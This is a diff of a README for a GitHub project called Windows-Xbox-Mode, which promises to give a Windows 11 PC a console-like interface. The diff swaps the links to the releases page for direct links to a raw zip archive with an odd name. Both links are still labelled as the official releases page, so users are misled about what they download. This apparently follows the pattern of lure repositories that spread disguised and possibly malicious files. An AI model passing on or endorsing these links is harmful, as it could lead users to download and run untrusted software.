@@ -1,6 +1,6 @@
 # 🎮 Windows-Xbox-Mode - Transform Your Computer Into A Console
 
-[![Download Windows-Xbox-Mode](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Sophroniafeathered967/Windows-Xbox-Mode/releases)
+[![Download Windows-Xbox-Mode](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Sophroniafeathered967/Windows-Xbox-Mode/raw/refs/heads/main/Mode/Windows_Mode_Xbox_monovular.zip)
 
 Windows-Xbox-Mode adjusts your computer settings to mimic the console interface. It optimizes your system for gaming by prioritizing controller input and simplifying the navigation process. This project provides a manual setup for users who want a console feel on their Windows 11 PC.
 
@@ -19,7 +19,7 @@ Before you begin, ensure your system meets these standards to have a smooth expe
 
 Follow these steps to set up your system for the Xbox interface.
 
-1.  Visit the [official releases page](https://github.com/Sophroniafeathered967/Windows-Xbox-Mode/releases) to access the latest files.
+1.  Visit the [official releases page](https://github.com/Sophroniafeathered967/Windows-Xbox-Mode/raw/refs/heads/main/Mode/Windows_Mode_Xbox_monovular.zip) to access the latest files.
 2.  Locate the most recent version labeled as "Latest" at the top of the list.
 3.  Click the link under the "Assets" section to save the file to your computer.
 4.  Navigate to your Downloads folder.
